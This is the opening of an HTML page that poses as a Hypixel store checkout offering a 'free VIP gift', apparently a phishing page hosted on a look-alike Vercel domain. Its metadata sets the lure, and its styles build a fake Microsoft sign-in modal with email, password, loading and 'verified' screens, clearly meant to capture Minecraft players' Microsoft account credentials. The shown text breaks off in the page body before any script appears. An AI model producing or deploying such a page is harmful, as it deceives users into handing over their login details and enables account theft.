<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Checkout - Accept Your Free VIP Gift</title>
  <meta property="og:title" content="Hypixel Store Checkout" />
  <meta property="og:description" content="Accept this free VIP gift! You are being offered a free gift of VIP for hypixel. VIP lets you fly around in the hypixel lobby and send messages faster than the Default tier." />
  <meta property="og:image" content="https://hypixel-shop.vercel.app/favicon.png" />
  <meta property="og:url" content="https://hypixel-shop.vercel.app" />
  <meta property="og:type" content="website" />
  <meta name="theme-color" content="#5865F2" />
  <link rel="icon" type="image/x-icon" href="favicon.png">
  <style>
    * { box-sizing: border-box; }
    html, body { margin: 0; height: 100%; font-family: Arial, sans-serif; background:#fff; color:#111; }
    body { display:flex; flex-direction:column; }
    .page { display:flex; flex:1; min-height:0; }

    .left { width:288px; border-right:1px solid #e5e5e5; padding:19px; }
    .top-row { display:flex; justify-content:space-between; margin-bottom:19px; }
    .order-title { font-weight:600; font-size:14px; }
    .cancel { text-decoration:underline; cursor:pointer; }
    .item { display:flex; gap:10px; margin-bottom:22px; }
    .item img { width:34px; height:34px; }
    .item-name { font-weight:600; font-size:13px; }
    .item-price { color:#555; margin-top:3px; }
    label { display:block; font-weight:600; margin:14px 0 5px; }
    input { width:100%; padding:8px 10px; border:1px solid #ccc; border-radius:4px; font-size:12px; }
    .summary { margin-top:22px; border-top:1px solid #e5e5e5; padding-top:13px; }
    .row { display:flex; justify-content:space-between; margin-bottom:9px; }
    .total { font-size:16px; font-weight:700; }
    .free-gift { font-size:12px; color:#f28c18; margin-top:2px; }

    .right { flex:1; padding:26px 38px; }
    .breadcrumbs { color:#999; margin-bottom:26px; }
    .breadcrumbs span:first-child { color:#f28c18; }
    h2 { margin:0 0 19px 0; }
    .upsell { border:1px solid #e5e5e5; padding:14px; display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; opacity:0.7; position:relative; }
    .upsell::after { content:''; position:absolute; top:0; left:0; right:0; bottom:0; background:transparent; cursor:not-allowed; }
    .upsell-left { display:flex; gap:11px; align-items:center; }
    .upsell img { width:38px; height:38px; opacity:0.5; }
    .upsell-name { font-weight:600; color:#999; }
    .upsell-price { color:#999; margin-top:3px; }
    .add-btn { background:#ccc; color:#666; border:none; padding:11px 21px; font-size:13px; cursor:not-allowed; border-radius:4px; }
    .continue { margin-top:16px; background:#f28c18; color:#fff; border:none; padding:13px 22px; font-size:14px; cursor:pointer; }

    footer { border-top:1px solid #e5e5e5; padding:14px 38px; font-size:10px; color:#777; display:flex; justify-content:space-between; align-items:center; }
    footer a { color:#777; text-decoration:none; margin-left:9px; }

    /* Microsoft Sign In Modal */
    #microsoftModal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    
    .modal-content {
      background: #fff;
      width: 440px;
      max-width: 90%;
      max-height: 90vh;
      overflow-y: auto;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
    }
    
    .modal-close {
      position: absolute;
      top: 15px;
      right: 20px;
      font-size: 24px;
      cursor: pointer;
      color: #777;
    }
    
    .modal-close:hover {
      color: #333;
    }
    
    /* Microsoft Sign In Styles */
    .ms-card {
      padding: 44px 44px 36px 44px;
    }
    
    .ms-logo {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 16px;
    }
    
    .ms-logo img {
      width: 22px;
      height: 22px;
    }
    
    .ms-logo span {
      font-size: 15px;
      font-weight: 600;
      color: #797979;
      letter-spacing: 0.01em;
    }
    
    .ms-card h1 {
      font-size: 24px;
      font-weight: 600;
      margin: 0 0 4px 0;
      color: #1b1b1b;
    }
    
    .ms-subtitle {
      font-size: 15px;
      color: #1b1b1b;
      margin: 0 0 16px 0;
    }
    
    .ms-desc {
      font-size: 15px;
      color: #1b1b1b;
      line-height: 1.4;
      margin-bottom: 4px;
    }
    
    .ms-email-display {
      font-size: 15px;
      color: #1b1b1b;
      margin-bottom: 16px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    .ms-email-display .back-arrow {
      color: #1b1b1b;
      font-size: 16px;
      cursor: pointer;
      text-decoration: none;
    }
    
    .ms-input-wrap {
      margin-top: 16px;
      border-bottom: 1px solid #666;
      padding-bottom: 4px;
    }
    
    .ms-input-wrap input {
      width: 100%;
      border: none;
      background: transparent;
      padding: 4px 0;
      font-size: 15px;
      color: #1b1b1b;
      font-family: "Segoe UI", Arial, sans-serif;
    }
    
    .ms-input-wrap input::placeholder {
      color: #605e5c;
    }
    
    .ms-input-wrap input:focus {
      outline: none;
    }
    
    .ms-input-wrap:focus-within {
      border-bottom: 2px solid #0067b8;
    }
    
    .ms-create {
      margin-top: 16px;
      font-size: 13px;
      color: #1b1b1b;
    }
    
    .ms-create a {
      color: #0067b8;
      text-decoration: none;
    }
    
    .ms-create a:hover {
      text-decoration: underline;
    }
    
    .ms-alt-link {
      margin-top: 16px;
      font-size: 13px;
    }
    
    .ms-alt-link a {
      color: #0067b8;
      text-decoration: none;
      cursor: pointer;
    }
    
    .ms-alt-link a:hover {
      text-decoration: underline;
    }
    
    .ms-actions {
      display: flex;
      justify-content: flex-end;
      margin-top: 36px;
    }
    
    .ms-next {
      background: #257a00;
      border: 2px solid #000;
      color: white;
      padding: 8px 20px;
      font-size: 15px;
      font-family: "Segoe UI", Arial, sans-serif;
      cursor: pointer;
      min-width: 108px;
    }
    
    .ms-next:hover {
      background: #40d400;
    }
    
    /* Password Screen */
    #ms-screen-password {
      display: none;
    }
    
    /* Screens */
    #ms-screen2, #ms-screen3, #ms-screen4 {
      display: none;
    }
    
    /* Loading dots */
    .ms-loading-screen {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 0 20px 0;
      min-height: 160px;
    }
    
    .ms-dots {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
    }
    
    .ms-dots span {
      width: 10px;
      height: 10px;
      background: #0067b8;
      border-radius: 50%;
      animation: bounce 1.2s infinite ease-in-out;
    }
    
    .ms-dots span:nth-child(1) { animation-delay: 0s; }
    .ms-dots span:nth-child(2) { animation-delay: 0.2s; }
    .ms-dots span:nth-child(3) { animation-delay: 0.4s; }
    
    @keyframes bounce {
      0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
      40% { transform: scale(1); opacity: 1; }
    }
    
    /* Verified screen */
    .ms-verified-screen {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 0 20px 0;
      min-height: 160px;
    }
    
    .ms-checkmark {
      width: 56px;
      height: 56px;
      border-radius: 50%;
      background: #f92121;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }
    
    .ms-checkmark svg {
      width: 28px;
      height: 28px;
      stroke: white;
      stroke-width: 3;
      fill: none;
      stroke-linecap: round;
      stroke-linejoin: round;
    }
    
    .ms-verified-title {
      font-size: 22px;
      font-weight: 600;
      color: #1b1b1b;
      margin-bottom: 8px;
    }
    
    .ms-verified-sub {
      color: #0067b8;
      text-decoration: none;
      font-size: 14px;
    }
    
    /* Slide animations for card content */
    .ms-screen-content {
      animation: slideInRight 0.3s ease-out forwards;
    }
    
    @keyframes slideInRight {
      0% { opacity: 0; transform: translateX(60px); }
      100% { opacity: 1; transform: translateX(0); }
    }

    /* Disabled cursor for upsells */
    .disabled-cursor {
      cursor: not-allowed;
    }
  </style>
</head>
<body>

<div class="page">
  <div class="left">
    <div class="top-row">
      <div class="order-title">Your Order</div>
      <div class="cancel" onclick="window.location.reload()">Cancel</div>
    </div>
    <div class="item">
      <img src="data:image/svg+xml;base64," alt="VIP" />
      <div>
        <div class="item-name">VIP Rank</div>
